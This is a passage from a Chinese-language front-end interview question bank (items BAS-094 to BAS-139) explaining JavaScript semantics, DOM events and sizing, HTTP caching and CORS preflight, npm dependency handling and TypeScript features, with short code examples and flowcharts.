- 取整差异：floor 向下、ceil 向上、round 四舍五入（.5 向上）、trunc 去尾；负数下 round(-1.5) 是 -1、floor(-1.5) 是 -2。

```javascript
console.log(0.1 + 0.2);                          // 0.30000000000000004
console.log(0.1 + 0.2 === 0.3);                  // false
console.log(Math.abs(0.1 + 0.2 - 0.3) < Number.EPSILON); // true
console.log(Math.round(-1.5), Math.floor(-1.5), Math.trunc(-1.5)); // -1 -2 -1
console.log(2 ** 53 | 0);                        // 0，| 0 按位截断超出 32 位不可靠
```

### BAS-094：逗号运算符和 void 运算符有什么用？
**答**：
- 逗号运算符依次求值、返回最后一个：常用于 for 循环多变量更新和压缩代码；箭头函数里 `(侧效果(), 返回值())` 是惯用技巧。
- void 后跟任意表达式都返回 undefined，经典用途 `href="javascript:void(0)"` 和获取纯 undefined（void 0）。
- 两者优先级都极低，容易出歧义，业务代码应克制使用。

```javascript
const log = [];
const step = (x) => (log.push(x), x);   // 先执行 push，再返回 x
console.log(step(1) + step(2), log);    // 3 [1, 2]
console.log(void 0 === undefined);      // true
console.log((1, 2, 3));                 // 3，取最后一个
```

## 十一、DOM 与事件补充

### BAS-095：offsetWidth/clientWidth/scrollWidth 三组尺寸有什么区别？
**答**：
- offsetWidth = content + padding + border（不含 margin）；clientWidth = content + padding，再减去滚动条宽度。
- scrollWidth = 溢出内容撑开的实际总宽，是"能滚多远"的依据；scrollTop/scrollLeft 可读写滚动位置。
- 判断元素是否出现纵向滚动：`scrollHeight > clientHeight`。

```javascript
/* .box { width:200px; padding:10px; border:5px solid; overflow:auto } */
const box = document.querySelector('.box');
console.log(box.offsetWidth);   // 230 = 200 内容 + 20 padding + 10 border
console.log(box.clientWidth);   // 220 再减去滚动条宽度
console.log(box.scrollHeight);  // 溢出内容的真实高度
console.log(box.scrollHeight > box.clientHeight); // true 表示纵向可滚动
```

```mermaid
flowchart TB
    A[offsetWidth<br/>border 以内的整体尺寸] --> B[clientWidth<br/>去掉 border 与滚动条]
    B --> C[scrollWidth<br/>再加上溢出的内容部分]
```

### BAS-096：getBoundingClientRect 返回的各值是什么含义？
**答**：
- 返回元素相对**视口**的位置与尺寸：top/left 是上、左边缘到视口的距离，right/bottom 是右、下边缘距离，width/height 含 border。
- 值随滚动实时变化：页面下滚时 top 变小甚至为负；加 window.scrollX/scrollY 才换算成文档坐标。
- 常用于吸顶判断、拖拽、碰撞与曝光检测；注意 width 是经 transform 缩放后的实际渲染尺寸。

```javascript
const rect = document.querySelector('#target').getBoundingClientRect();
const docX = rect.left + window.scrollX;  // 换算成文档坐标
const docY = rect.top + window.scrollY;
const inView = rect.top < window.innerHeight && rect.bottom > 0; // 是否在视口内
console.log(docX, docY, inView);
```

### BAS-097：closest、matches、contains 分别做什么？
**答**：
- closest(selector)：从自身沿祖先向上找最近匹配（含自身），事件委托里定位真实触发源的首选。
- matches(selector)：判断当前元素是否命中选择器，返回布尔值。
- contains(node)：判断某节点是否是当前节点的后代（或自身），"点击外部关闭弹窗"就用它取反。

```javascript
list.addEventListener('click', (e) => {
  const item = e.target.closest('li.item');  // 向上定位目标项
  if (!item) return;                          // 点在容器空白处
  if (item.matches('.item.active')) item.classList.remove('active');
});
document.addEventListener('click', (e) => {
  if (!popover.contains(e.target)) popover.hide(); // 点在弹窗外部才关闭
});
```

### BAS-098：createDocumentFragment 有什么用？
**答**：
- 轻量内存节点容器：先把子节点批量挂到 fragment，再一次 appendChild 进文档，只触发一次回流。
- 循环直接 append 到真实 DOM 会反复触发布局计算，大数据量插入时性能差距明显。
- fragment 插入后自身不会进入 DOM，子节点被"搬运"进去。

```javascript
const frag = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  const li = document.createElement('li');
  li.textContent = `item ${i}`;
  frag.appendChild(li);      // 先攒在内存 fragment 里
}
document.querySelector('ul').appendChild(frag);  // 一次性插入
```

### BAS-099：compositionstart 这组中文输入法事件是什么？
**答**：
- 输入法组词过程触发 compositionstart → compositionupdate（多次）→ compositionend，期间敲的拼音不是最终输入。
- 搜索框实时联想必须处理：组词期间不触发搜索，等 compositionend 再查，否则拼音字母被当成关键词。
- 通用做法：start 置 isComposing = true，end 置 false；input 回调里先判断再处理。

```javascript
let composing = false;
const input = document.querySelector('#search');
input.addEventListener('compositionstart', () => (composing = true));
input.addEventListener('compositionend', () => {
  composing = false;
  doSearch(input.value);                    // 组词结束才搜索
});
input.addEventListener('input', () => {
  if (!composing) doSearch(input.value);    // 英文数字直接搜
});
```

### BAS-100：passive 事件监听有什么作用？
**答**：
- `{ passive: true }` 告诉浏览器该监听器绝不调 preventDefault，滚动不用等 JS 执行完，消除滚动卡顿。
- touchstart/touchmove、wheel 这类能取消滚动的事件，浏览器默认要等监听器结果才决定是否滚动，会阻塞合成器线程。
- passive 监听器里调 preventDefault 无效并打印告警；需要阻止滚动的场景才用 passive: false。

```javascript
// 声明不会阻止默认滚动，滚动更顺滑
window.addEventListener('wheel', onWheel, { passive: true });
window.addEventListener('touchmove', onTouch, { passive: true });

// 确实要阻止滚动的场景（如抽奖转盘）才不用 passive
canvas.addEventListener('touchmove', (e) => e.preventDefault(), { passive: false });
```

### BAS-101：preventDefault、stopPropagation、stopImmediatePropagation 有什么区别？
**答**：
- preventDefault：阻止浏览器默认行为（提交表单、跳转链接），不影响事件继续传播。
- stopPropagation：阻止事件继续向其他节点传播，但同一元素上已注册的其他监听器仍会执行。
- stopImmediatePropagation：传播停止，且同一元素上排在它后面的监听器也不再执行。

```javascript
form.addEventListener('submit', (e) => e.preventDefault());  // 阻止提交，冒泡继续
inner.addEventListener('click', (e) => e.stopPropagation()); // 父级的 click 不触发
btn.addEventListener('click', () => console.log('A'));
btn.addEventListener('click', (e) => {
  e.stopImmediatePropagation();
  console.log('B');
});
btn.addEventListener('click', () => console.log('C'));       // 不会打印
```

### BAS-102：visibilitychange 和 beforeunload 分别什么时候用？
**答**：
- visibilitychange：切后台标签/最小化时 document.hidden 变 true，用于暂停视频、停轮询、上报埋点，比 unload 可靠得多。
- beforeunload：用户即将离开时触发，配合 preventDefault 可弹离开确认（现代浏览器不显示自定义文案）；移动端不保证触发。
- 卸载阶段上报数据用 `navigator.sendBeacon`，普通异步请求会被浏览器掐断。

```javascript
document.addEventListener('visibilitychange', () => {
  if (document.hidden) video.pause();
  else video.play();
});
window.addEventListener('beforeunload', (e) => {
  if (hasUnsavedChanges) {
    e.preventDefault();     // 触发离开确认
    e.returnValue = '';
  }
});
window.addEventListener('pagehide', () => navigator.sendBeacon('/log', payload));
```

### BAS-103：ResizeObserver 和 MutationObserver 分别观察什么？
**答**：
- ResizeObserver 监听元素**自身尺寸**变化，比 window.resize 精细到单个元素，容器自适应场景首选。
- MutationObserver 监听 DOM 树变化（childList/attributes/characterData），回调在微任务时机批量执行；第三方脚本、富文本编辑器常用。
- 还有 IntersectionObserver 监听与视口相交（懒加载、曝光埋点），三者组成替代 scroll 事件的观察器家族。

```javascript
new ResizeObserver((entries) => {
  const { width } = entries[0].contentRect;
  chart.resize(width);                 // 元素变宽就重绘图表
}).observe(box);

new MutationObserver((muts) => {
  console.log(muts[0].type, muts[0].addedNodes);  // childList / attributes / characterData
}).observe(list, { childList: true, subtree: true });
```

### BAS-104：怎么用 CustomEvent 传递自定义数据？
**答**：
- `new CustomEvent(type, { detail, bubbles })`：detail 携带任意数据，bubbles 让事件向上冒泡被外层捕获。
- 配合 dispatchEvent 实现同页面模块解耦，等于浏览器原生的发布订阅。
- 事件名加命名空间前缀防冲突；监听要在 dispatch 之前注册。

```javascript
// 发布方：任何地方
document.dispatchEvent(new CustomEvent('cart:added', {
  detail: { id: 42, count: 1 },
  bubbles: true,
}));
// 订阅方
document.addEventListener('cart:added', (e) => {
  console.log(e.detail.id, e.detail.count);  // 42 1
});
```

## 十二、网络与浏览器补充

### BAS-105：什么情况下会触发 OPTIONS 预检请求？
**答**：
- 非简单请求先发 OPTIONS 探路：方法为 PUT/DELETE/PATCH 等，或 Content-Type 不是三种简单值，或携带自定义头（如 X-Token、Authorization）。
- 简单请求判定：GET/HEAD/POST 之一，Content-Type 限于 text/plain、multipart/form-data、application/x-www-form-urlencoded，且无自定义头。
- 预检由浏览器自动发出，服务端对 OPTIONS 返回 2xx 并带 Access-Control-Allow-Methods/Headers；Access-Control-Max-Age 可缓存预检结果减少次数。

```http
# 前端带自定义头的请求，浏览器先自动发预检
OPTIONS /api/user HTTP/1.1
Access-Control-Request-Method: POST
Access-Control-Request-Headers: x-token

# 服务端响应
HTTP/1.1 204 No Content
Access-Control-Allow-Methods: POST, DELETE
Access-Control-Allow-Headers: x-token
Access-Control-Max-Age: 86400
```

```mermaid
flowchart TD
    A[发起跨域请求] --> B{方法是 GET HEAD POST 之一}
    B -- 否 --> F[先发 OPTIONS 预检]
    B -- 是 --> C{Content-Type 为三种简单值之一}
    C -- 否 --> F
    C -- 是 --> D{是否携带自定义头}
    D -- 是 --> F
    D -- 否 --> E[简单请求直接发送]
    F --> G[服务端返回允许的方法与头]
    G --> H[浏览器再发真实请求]
```

### BAS-106：HTTP 断点续传怎么实现？
**答**：
- 客户端带 `Range: bytes=start-end` 请求部分内容，服务端支持时返回 206 Partial Content 和 `Content-Range: bytes start-end/总大小`。
- 靠它实现分片并行下载、失败从断点续传；服务端不支持 Range 时返回 200 全量内容。
- 前端大文件上传同理：按分片切割、逐片传、记录进度，失败只重传失败分片。

```http
GET /video.mp4 HTTP/1.1
Range: bytes=1048576-

HTTP/1.1 206 Partial Content
Content-Range: bytes 1048576-2097151/5242880
Content-Length: 1048576
```

### BAS-107：HTTP keep-alive 解决什么问题？
**答**：
- 每个请求都新建 TCP 连接要付三次握手和慢启动的开销；keep-alive 让一条 TCP 连接复用多个请求。
- HTTP/1.1 默认开启，但同一连接请求串行，存在队头阻塞：前一个响应没完，后续请求必须排队。
- HTTP/2 单连接多路复用（并行流）解决应用层队头阻塞；HTTP/3 换 QUIC 进一步解决 TCP 层队头阻塞。

```http
HTTP/1.1 200 OK
Connection: keep-alive
Keep-Alive: timeout=5, max=100
# 同一条 TCP 连接在超时或达到 max 个请求前持续复用
```

### BAS-108：缓存相关的响应头怎么速记？
**答**：
- 强缓存：`Cache-Control: max-age=31536000, immutable`，命中期间不发请求（优先级高于 Expires）。
- 协商缓存：响应带 ETag 或 Last-Modified，下次请求带 If-None-Match / If-Modified-Since，未变化返回 304 不带 body。
- 策略速记：index.html 用 no-cache（每次协商），带 hash 的静态资源 max-age 一年 immutable。

```http
# HTML：禁强缓存，走协商
Cache-Control: no-cache
ETag: "abc123"

# 带 hash 的 JS/CSS：一年强缓存
Cache-Control: public, max-age=31536000, immutable
```

### BAS-109：localhost 和 127.0.0.1 有什么区别？hosts 文件是干嘛的？
**答**：
- localhost 是域名要先解析（可能解析到 IPv6 ::1）；127.0.0.1 是环回 IPv4 地址。服务只监听 ::1 时用 127.0.0.1 会连不上，反之亦然。
- 127.0.0.0/8 整段都指向本机，127.0.0.2 等同样可用，可在同机模拟不同"IP"。
- hosts 文件把域名映射到 IP、优先于 DNS，本地调试伪造线上域名靠它（macOS 路径 /etc/hosts）。

```bash
# /etc/hosts：本地域名映射
127.0.0.1  dev.example.com
::1        dev.example.com   # 同时映射 IPv6，避免解析回退
sudo dscacheutil -flushcache      # macOS 清 DNS 缓存
curl -v http://dev.example.com:3000
```

### BAS-110：怎么判断 CDN 有没有命中？回源是什么？
**答**：
- 看响应头 `X-Cache: HIT/MISS`（各厂商字段名略异，如 Ali-Swift-Cache）。
- MISS 表示边缘节点无缓存，回源站取数（回源），取回后按 Cache-Control 缓存到边缘，下次同节点 HIT。
- 排查：响应头看 X-Cache 和 Age（已缓存秒数），用 `curl -I` 连打几次观察 MISS → HIT 转变；长期 MISS 要查缓存配置与 URL 是否带随机参数。

```bash
curl -sI https://cdn.example.com/app.js | grep -iE 'x-cache|age|cache-control'
# x-cache: MISS        第一次请求，回源
# x-cache: HIT         再次请求命中边缘节点
# age: 120             已在边缘缓存 120 秒
```

### BAS-111：页面生命周期有哪些关键 API？
**答**：
- 核心 API：visibilitychange（前台/后台）、pagehide/pageshow（含 bfcache 恢复的 persisted 标记）、freeze/resume（系统省资源冻结页面）。
- 状态流转大致是 active → passive（失焦未切走）→ hidden（切后台）→ frozen → terminated（卸载）。
- 数据上报在 hidden 时用 sendBeacon 而不是 unload；从 bfcache 返回的页面要重置动态状态。

```javascript
document.addEventListener('visibilitychange', () => {
  if (document.visibilityState === 'hidden') {
    navigator.sendBeacon('/report', JSON.stringify({ page: 'basics' }));
  }
});
window.addEventListener('pageshow', (e) => {
  if (e.persisted) console.log('从 bfcache 恢复，需重置动态状态');
});
```

```mermaid
flowchart TD
    A[active 活跃中] -->|失去焦点| B[passive 失焦]
    B -->|重新聚焦| A
    B -->|切后台或锁屏| C[hidden 后台]
    C -->|系统冻结省资源| D[frozen 冻结]
    D -->|恢复| A
    C -->|用户关闭页面| E[terminated 卸载]
    E --> F[页面结束]
```

## 十三、TypeScript 与工程基础补充

### BAS-112：as const 有什么实际用途？
**答**：
- 把对象/数组断言为最深层的只读字面量类型：数组变 readonly 元组，属性值收窄为字面量（'asc' 而不是 string）。
- 典型场景：常量数组收窄后推导联合类型，替代手写枚举。
- 注意 as const 后对象整体 readonly，不能改属性、不能 push。

```typescript
const DIRS = ['asc', 'desc'] as const;
type Dir = (typeof DIRS)[number];        // 'asc' | 'desc'
const config = { api: '/api', retry: 3 } as const;
// config.retry = 5;                     // 报错：readonly
function sort(list: number[], dir: Dir) {}
sort([3, 1], 'asc');                     // 只接受两个字面量
```

### BAS-113：非空断言 ! 和可选链 ?. 有什么区别？
**答**：
- `a!.b` 是编译期"我保证 a 不是 null/undefined"，运行时零检查，判断错了就真崩。
- `a?.b` 是运行时安全访问，a 为空时返回 undefined 不抛错。
- 优先用 ?.；! 只在确证非空（刚校验过、DOM 一定存在）时用，滥用等于关闭类型检查。

```typescript
const el = document.getElementById('app');
// el.innerHTML = 'hi';                 // 报错：el 可能是 null
el!.innerHTML = 'hi';                   // 断言非空，运行时无保护
const len = el?.innerHTML.length ?? 0;  // 安全访问 + 兜底
```

### BAS-114：TypeScript 函数重载怎么写？
**答**：
- 重载签名只声明不实现，列出各调用形态；最后是实现签名，参数类型要兼容所有形态。
- 调用时按签名从上到下匹配；实现内部需自行用 typeof 收窄参数。
- 只在"同一函数不同入参形态且返回类型随入参变化"时用，滥用不如联合类型直观。

```typescript
function parse(input: string): string[];
function parse(input: number): string;
function parse(input: string | number): string[] | string {
  return typeof input === 'string' ? input.split(',') : String(input * 100);
}
const a = parse('a,b');   // string[]
const b = parse(1.23);    // string
```

### BAS-115：元组和 readonly 数组怎么用？
**答**：
- 元组 `[string, number]` 固定长度、每个位置类型确定，适合返回多个不同类型的值；可命名：`[start: number, end: number]`。
- `readonly number[]` 禁止 push/pop 等修改；函数参数声明为 readonly 数组还能同时兼容元组。
- React 的 useState 返回类型就是元组：`[T, (v: T) => void]`。

```typescript
function useSize(): readonly [width: number, height: number] {
  return [window.innerWidth, window.innerHeight];
}
const [w, h] = useSize();            // 解构出 number
const list: readonly number[] = [1, 2, 3];
// list.push(4);                     // 报错：readonly
const point: [x: number, y: number] = [10, 20];
```

### BAS-116：tsconfig 的 include/exclude 怎么配？报错怎么排查？
**答**：
- include/exclude 决定哪些文件参与编译；exclude 排不掉被 include 文件 import 进来的文件，files 可精确指定入口。
- 报错排查三步：看错误码定位类型不匹配 → 检查 target/module/lib 与 strict 配置 → `tsc --noEmit` 单独跑类型检查。
- 常见坑：装了包仍报"找不到模块"，多半缺 @types 声明或 moduleResolution 配置不当。

```json
{
  "compilerOptions": {
    "strict": true,
    "noEmit": true,
    "moduleResolution": "bundler"
  },
  "include": ["src"],
  "exclude": ["node_modules", "dist"]
}
```

### BAS-117：package-lock.json 有什么作用？
**答**：
- 锁定整棵依赖树的精确版本与下载地址，任何机器装出完全相同的 node_modules。
- package.json 的 `^1.2.3` 是版本范围，不同时间安装可能拿到不同次版本，酿成"我本地好好的"事故。
- lock 文件必须提交；CI 用 `npm ci` 严格按 lock 安装（要求 lock 与 package.json 同步），本地升级用 npm update 或显式 install 更新 lock。

```bash
npm ci             # 严格按 lock 安装，先删 node_modules，CI 首选
npm update lodash  # 在 semver 范围内升级并更新 lock
npm ls lodash      # 查看依赖树中 lodash 的实际版本
```

### BAS-118：npm 扁平化和幽灵依赖是怎么回事？
**答**：
- npm v3+ 把依赖尽量拍平到 node_modules 顶层，导致 package.json 没声明的包也能 require 到——幽灵依赖。
- 危险：上游某天不再依赖它，你的代码直接崩；pnpm 用符号链接的严格结构天然杜绝幽灵依赖。
- 防御：用到的包显式声明进 package.json，用 depcheck 扫描漏声明的依赖。

```bash
npm ls --all | head   # 查看依赖树结构
npx depcheck          # 找出未声明或未使用的依赖
# 即使顶层能直接找到，也要显式 npm i <pkg> 声明
```

### BAS-119：peerDependencies 装包时会发生什么？
**答**：
- peerDependencies 声明"我需要宿主提供某包"：插件要求宿主装 react，而不是自己再带一份，避免双实例（hooks 报错、context 断裂）。
- npm v7+ 默认自动安装 peer 依赖，v6 要自己装；版本不满足会告警，`--legacy-peer-deps` 可跳过安装。
- 写组件库、eslint 插件时的必看字段。

```json
{
  "name": "my-ui-lib",
  "peerDependencies": {
    "react": ">=18"
  },
  "devDependencies": {
    "react": "^18.3.0"
  }
}
```

### BAS-120：npx 是什么？和 npm run 有什么区别？
**答**：
- npx 临时执行包的命令：先找本地 node_modules/.bin，没有就临时下载执行（--no-install 可禁止下载），不污染依赖。
- npm run 只能跑 scripts 里声明的命令，npx 可以直接跑任意包的 bin。
- 典型用法：一次性脚手架、用项目内版本而非全局版本执行工具。

```bash
npx create-vite@latest my-app   # 临时下载脚手架并执行
npx tsc --noEmit                # 优先用项目内安装的 tsc 而非全局
npx --no-install jest           # 只用本地已装版本，没有则报错
```

## 十四、综合速答

### BAS-121：cookie、session、JWT 一句话速记？
**答**：
- cookie：浏览器存储、自动随同源请求携带的小段数据；session：状态存服务端，cookie 里只放 sessionId。
- JWT：状态编码在 token 里（header.payload.signature），服务端无状态、签名防篡改；缺点是无法主动作废、payload 是明文。
- 速记：session 有状态放服务端，JWT 无状态放客户端，cookie 是两者的搬运工。

```http
# session 方案：cookie 只带会话 ID
Cookie: JSESSIONID=abc123

# JWT 方案：token 自带信息与签名
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjF9.xxxx
# payload 是 base64url 明文，别放敏感数据
```

### BAS-122：同源页面之间有哪些跨页面通信方式？
**答**：
- BroadcastChannel：同源多标签广播，实时同步首选；localStorage 的 storage 事件也能跨标签通知（本页不触发）。
- SharedWorker：同源多页面共享一个 worker 实例与状态。
- 跨源场景用 postMessage（iframe、window.open 的窗口间）；Service Worker 也可做消息中转。

```javascript
const ch = new BroadcastChannel('cart');
ch.postMessage({ type: 'add', id: 42 });   // 广播到所有同源标签页
ch.onmessage = (e) => console.log('收到', e.data);

localStorage.setItem('sync', JSON.stringify({ t: Date.now() }));
window.addEventListener('storage', (e) => {  // 其他标签页触发，本页不触发
  console.log('storage 变化', e.key, e.newValue);
});
```

```mermaid
flowchart TD
    A[跨页面通信] --> B[同源场景]
    A --> C[跨源场景]
    B --> B1[BroadcastChannel]
    B --> B2[storage 事件]
    B --> B3[SharedWorker]
    C --> D[postMessage]
```

### BAS-123：DPR 是什么？对移动端开发有什么影响？
**答**：
- DPR = 物理像素 / CSS 像素；iPhone DPR 为 2 或 3，1px CSS 边框实际占 2~3 个物理像素，这就是"1px 变粗"问题。
- 设计稿按 @2x/@3x 出图，配合 srcset 或高倍图缩小显示保证清晰。
- REM 适配和 viewport 缩放方案本质都是在不同 DPR 下保持视觉一致；`window.devicePixelRatio` 可读取当前值。

```javascript
const dpr = window.devicePixelRatio;
console.log(`物理像素比 ${dpr}`);   // 2 或 3
// 高倍图按 DPR 选择
const img = new Image();
img.src = dpr >= 2 ? 'logo@2x.png' : 'logo.png';
```

### BAS-124：JSONP 为什么只支持 GET？
**答**：
- JSONP 本质是用 `<script src>` 绕过同源策略：script 标签加载不受 CORS 限制，但它只能发起 GET 请求。
- 服务端把数据包进回调返回 `callback({"data": 1})`，浏览器当作 JS 执行从而拿到数据。
- 现代方案是 CORS，JSONP 只在维护老系统时出现；回调名可被注入，存在 XSS 风险。

```html
<script>
  function handle(data) { console.log('拿到数据', data); }
</script>
<!-- 服务端返回 handle({"code": 0, "data": [1, 2, 3]}) 作为 JS 执行 -->
<script src="https://api.example.com/list?callback=handle"></script>
```

### BAS-125：file:// 协议下前端开发有哪些限制？
**答**：
- 每个 file 页面被视为不透明源：fetch/XHR 一律视为跨域被拦，无法请求本地其他文件。
- ES 模块受 CORS 限制，`type="module"` 在 file:// 下直接报错；Cookie、部分存储行为异常。
- 所以本地调试必须走 HTTP 服务（vite dev server、npx serve 等），不要直接双击 html 文件。

```bash
npx serve .                        # 快速起本地静态服务
# 浏览器访问 http://localhost:8000
# 而不是 file:///Users/xx/project/index.html
```

## 十五、深入 JS 语义

### BAS-126：函数声明和函数表达式的提升有什么差异？
**答**：
- 函数声明整体提升（名字和函数体都进作用域顶部），声明前可以调用。
- 函数表达式只提升变量本身：var 提升为 undefined，提前调用报 TypeError；let/const 版本提前调用报 ReferenceError（死区）。
- 面试常考：同一名字重复声明时，函数声明会覆盖 var 声明。

```javascript
foo();               // 'declared' —— 函数声明整体提升，可先调用
function foo() { console.log('declared'); }

bar();               // TypeError：var bar 提升后是 undefined，不是函数
var bar = function () { console.log('expr'); };

baz();               // ReferenceError：let 声明的函数表达式在死区内
let baz = function () {};
```

### BAS-127：暂时性死区（TDZ）是什么？举一个实例。
**答**：
- let/const 变量从"块级作用域开始"到"声明语句执行完"之间是死区，访问即抛 ReferenceError，而不是得到 undefined。
- `typeof` 也不再安全：对死区中的变量做 typeof 同样报错，这与未声明变量返回 'undefined' 不同。
- 本质是 let/const 用"先声明后访问"的强约束替代 var 的静默提升。

```javascript
{
  // 死区从块首开始，到 let x 这一行结束
  console.log(x);  // ReferenceError，不是 undefined
  let x = 1;
}
console.log(typeof undeclaredVar); // 'undefined'：未声明的变量 typeof 安全
console.log(typeof y);             // ReferenceError：死区内的变量 typeof 也不放过
let y;
```

### BAS-128：for 循环里用 var 和 let 配 setTimeout 输出有什么区别？
**答**：
- var 版本：i 是函数级全局绑定，回调执行时循环已结束，输出 3 3 3。
- let 版本：每轮迭代都会创建一个全新的 j 绑定，闭包捕获当轮副本，输出 0 1 2。
- 本质：let 的块级作用域 + 迭代级新建绑定，等价于每轮用 IIFE 复制一份值。

```javascript
for (var i = 0; i < 3; i++) setTimeout(() => console.log(i));
// 输出 3 3 3：三个闭包共享同一个全局 i，执行时 i 已经是 3

for (let j = 0; j < 3; j++) setTimeout(() => console.log(j));
// 输出 0 1 2：let 每轮迭代新建绑定，闭包捕获的是当轮的 j 副本
```

### BAS-129：标签语句怎么配合 break 和 continue 使用？
**答**：
- `label: statement` 给语句打标签，break label 一次性跳出整个标签块，continue label 直接进入标签所在外层循环的下一轮。
- 用于多层嵌套循环的精准跳出，避免用标志位层层判断；日常代码少用，面试考概念。

```javascript
outer:
for (let i = 0; i < 3; i++) {
  for (let j = 0; j < 3; j++) {
    if (j === 1) continue outer;  // 跳过本轮内层，直接进入外层下一轮
    if (i === 2) break outer;     // 一次性跳出两层循环
    console.log(i, j);
  }
}
// 输出：0 0  1 0  然后中断
```

### BAS-130：严格模式相对普通模式有哪些差异点？
**答**：
- 禁止隐式创建全局变量（未声明赋值直接报错）；普通函数调用时 this 是 undefined，不再指向 window。
- 禁止 with、八进制字面量、delete 变量、函数参数重名；arguments 与具名参数不再联动。
- eval 拥有独立作用域，不再污染外层；给不可写属性赋值从静默失败变成报错。

```javascript
'use strict';
x = 1;               // ReferenceError：禁止隐式全局变量
function f() { console.log(this); }
f();                 // undefined：普通调用不再指向 window
function g(a, a) {}  // SyntaxError：参数不允许重名
// 其他：禁 with / 八进制 / delete 变量；arguments 与参数脱钩
```

### BAS-131：隐式 this 绑定在哪些场景会丢失？
**答**：
- 方法赋值给变量再调用、方法作为回调传入（forEach/addEventListener/setTimeout）、解构取出方法，这三类都会让 this 脱离原对象。
- 非严格模式下退化为全局对象，严格模式下是 undefined。
- 修复手段：bind 固定 this、箭头函数捕获外层 this、调用时保持 obj.fn() 形式。

```javascript
const obj = { name: 'a', getName() { return this.name; } };
const lost = obj.getName;               // 场景1：赋值给变量
console.log(lost());                    // undefined，this 已丢失
[obj.getName].forEach(fn => console.log(fn())); // 场景2：作为回调传入
const fixed = obj.getName.bind(obj);    // 修复：bind 固定 this
console.log(fixed());                   // 'a'
```

### BAS-132：展开运算符拷贝对象的边界在哪里？
**答**：
- `{...obj}` / `[...arr]` 只做一层浅拷贝：第一层是独立副本，嵌套的引用类型仍指向同一份。
- 拷贝的是自有可枚举属性；Symbol 属性也会被拷贝，但原型链不会保留。
- 深层嵌套要独立副本得用 structuredClone 或递归深拷贝。

```javascript
const src = { a: 1, nested: { b: 2 }, arr: [3] };
const copy = { ...src, d: 4 };
copy.nested.b = 99;
console.log(src.nested.b); // 99 —— 嵌套对象是同一个引用
copy.a = 100;
console.log(src.a);        // 1 —— 第一层是独立副本
```

### BAS-133：剩余参数和 arguments 有什么区别？
**答**：
- 剩余参数 `...rest` 是真数组，可用数组方法；arguments 是类数组对象，需 Array.from 转换。
- arguments 含全部实参（含未被形参声明的），剩余参数只收 形参之外 的实参。
- 箭头函数没有自己的 arguments，剩余参数是唯一选择。

```javascript
function legacy() { console.log(arguments.length, arguments[0]); }
legacy(1, 2, 3);   // 3 1 —— 类数组，没有 map 等数组方法

function modern(first, ...rest) {
  console.log(rest.length, rest.map(x => x * 2)); // 真数组
}
modern(1, 2, 3);   // 2 [ 4, 6 ] —— 只收 first 之外的实参

const arrow = (...rest) => rest; // 箭头函数没有 arguments，只能用剩余参数
```

### BAS-134：函数默认参数是"惰性求值"怎么理解？
**答**：
- 默认值表达式在"每次调用且实参缺失时"才求值，不是函数定义时算好缓存。
- 求值环境可以引用前面已声明的形参，形成参数间依赖。
- 面试考点：传 undefined 才触发默认值，传 null 不会。

```javascript
let n = 0;
function add(step = ++n, base = step) { return step + base; }
console.log(add());    // 2 —— 每次调用重新求值，n 从 0 变 1
console.log(add());    // 4 —— 再调用 n 变 2，说明不是定义时固定
console.log(add(10));  // 20 —— base 默认值引用了前面的 step
console.log(add(null, 5)); // 5 —— null 不触发默认值，step 是 null
```

### BAS-135：短路求值有哪些实用技巧？
**答**：
- `&&`：左值为假就返回左值，常用来做"满足才执行"或防空取值。
- `||`：左值为真就返回左值，对所有假值兜底，但 0、'' 有业务含义时会误伤。
- `??`：只对 null/undefined 兜底，是更安全的默认值写法；与 && 混用需加括号。

```javascript
const val = maybeObj && maybeObj.field; // 前面为假值时直接返回，不再取属性
const port = customPort ?? 8080;        // 只对 null/undefined 用默认值，0 不受影响
const tag = userTag || 'guest';         // 对所有假值兜底，userTag 为 0 时会误伤
if (isReady) run();                     // 常规写法；cond && run() 是同一语义的简写
```

### BAS-136：位运算有哪些常用技巧？
**答**：
- 取整：`x | 0`、`~~x` 截断为 32 位有符号整数（超出范围会出错，大数别用）。
- 判奇偶：`x & 1` 为 1 是奇数；移位 `x << 1` 等于乘 2、`x >> 1` 等于除 2 取整。
- 交换变量可用 `a ^= b; b ^= a; a ^= b;`（面试常问，工程上更推荐解构交换）。

```javascript
console.log(3.9 | 0);  // 3   —— 按 32 位整数取整
console.log(7 & 1);    // 1   —— 奇数；结果为 0 即偶数
console.log(1 << 4);   // 16  —— 左移一位乘 2
console.log(16 >> 2);  // 4   —— 右移除 2 取整
console.log(8 & 7);    // 0   —— x 与 x-1 无公共位，说明 x 是 2 的幂
let a = 1, b = 2;
a ^= b; b ^= a; a ^= b; // 异或交换后 a=2 b=1
```

### BAS-137：ToPrimitive 把对象转原始值的流程是什么？
**答**：
- 优先调用 `Symbol.toPrimitive(hint)`；没有才按 hint 走 valueOf/toString。
- hint 为 number 或 default：先 valueOf 再 toString；hint 为 string：先 toString 再 valueOf。
- 两步之后仍是对象就抛 TypeError；Date 是例外，default 提示下先 toString。

```javascript
const obj = {
  valueOf() { return 10; },
  toString() { return 'obj'; },
};
console.log(obj * 2);      // 20 —— number 提示，走 valueOf
console.log(`${obj}`);     // 'obj' —— string 提示，走 toString
console.log(obj + '');     // 10 —— default 提示先 valueOf，得到 10 再转字符串
console.log(obj + 'x');    // '10x'
```

```mermaid
flowchart TD
    A[对象转原始值 ToPrimitive] --> B{是否定义 Symbol.toPrimitive}
    B -- 有 --> C[优先调用它]
    B -- 没有 --> D{按转换 hint 分流}
    D -- number 或 default --> E[先 valueOf 再 toString]
    D -- string --> F[先 toString 再 valueOf]
    E --> G{结果是否为原始值}
    F --> G
    G -- 是 --> H[返回该原始值]
    G -- 否 --> I[抛 TypeError]
```

### BAS-138：包装对象是什么？访问原始值属性时发生了什么？
**答**：
- 原始值（string/number/boolean）访问属性或方法时，引擎临时创建 String/Number/Boolean 包装对象，调用完立即丢弃。
- 因此给原始值"挂属性"不会报错但也不生效——属性写到了临时对象上，随销毁消失。
- `new String('x')` 是显式包装得到对象；`String('x')` 是转换函数得到原始值，两者 typeof 不同。

```javascript
const s = 'hello';
console.log(s.length);        // 5 —— 临时包装成 String 对象后读取
s.temporary = 1;
console.log(s.temporary);     // undefined —— 属性挂在临时对象上，读完即销毁
console.log(typeof new String('x')); // 'object' —— 显式包装是对象
console.log(typeof String('x'));     // 'string' —— 不带 new 是类型转换
```

### BAS-139：属性描述符有哪几个字段？defineProperty 怎么用？
**答**：
- 数据描述符四件套：value、writable（能否改值）、enumerable（能否被枚举）、configurable（能否删除或改描述符）。
